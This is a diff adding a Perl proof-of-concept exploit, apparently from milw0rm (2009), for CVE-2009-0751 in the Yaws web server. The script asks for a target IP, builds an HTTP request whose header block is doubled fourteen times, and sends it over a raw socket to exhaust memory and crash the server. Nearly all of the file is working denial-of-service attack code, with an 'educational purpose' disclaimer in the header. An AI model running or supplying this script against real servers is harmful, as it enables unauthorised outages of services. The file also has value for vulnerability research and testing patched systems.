@@ -1,0 +1,66 @@
+#!usr/bin/perl -w
+
+#######################################################################################
+#   Yaws before 1.80 allows remote attackers to cause a denial of service (memory
+#   consumption and crash) via a request with a large number of headers.
+#   Refer:
+#        http://yaws.hyber.org/
+#        http://www.securityfocus.com/bid/33834/discuss
+#        http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0751
+#
+#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
+#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
+#
+#        Author:    Praveen Dar$hanam
+#        Email:     praveen[underscore]recker[at]sify.com
+#        Blog:       http://www.darshanams.blogspot.com/
+#        Date:      03rd March, 2009
+#        Site:       http://www.evilfingers.com/
+#
+###Thanx to str0ke, milw0rm, Manuel Duran Aguete, @rp m@n, and all the Security Folks###
+########################################################################################
+
+use IO::Socket;
+
+print("\nEnter IP Address of Yaws Server(not domain): \n");
+$vuln_host_ip = <STDIN>;
+chomp($vuln_host_ip);
+$port = 80;
+
+$sock_http = IO::Socket::INET->new(  PeerAddr => $vuln_host_ip,
+                                     PeerPort => $port,
+                                     Proto    => 'tcp') || "Unable to create HTTP Socket";
+
+
+$headers="Date: Tue, 03 Mar 2009 15:17:53 GMT\r\n".
+"Accept-Ranges: bytes\r\n".
+"Content-Language: en\r\n".
+"Content-Type: text/html; charset=utf-8\r\n".
+"Expires: Thu, 05 Mar 2009 15:17:53 GMT\r\n".
+"Cache-Control: no-cache\r\n".
+"Content-Encoding: gzip\r\n".
+"Retry-After: 100\r\n";
+print "\nHeaders are:\n$headers";
+
+$i=0;
+while($i<=13)    #this is just a PoC
+{
+$headers=$headers.$headers;
+$i++;
+}
+print "\nHeaders are:\n$headers";
+$yaws_attack = "GET / HTTP/1.1\r\n".
+"Host: $vuln_host_ip:$port\r\n".
+"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
+$headers.
+"Keep-Alive: 300\r\n".
+"Connection: keep-alive\r\n".
+"\r\n";
+sleep(3);
+print $sock_http $yaws_attack;
+sleep(2);
+print"\nRequest with large number of Headers sent...\n";
+
+close($sock_http);
+
+# milw0rm.com [2009-03-03]
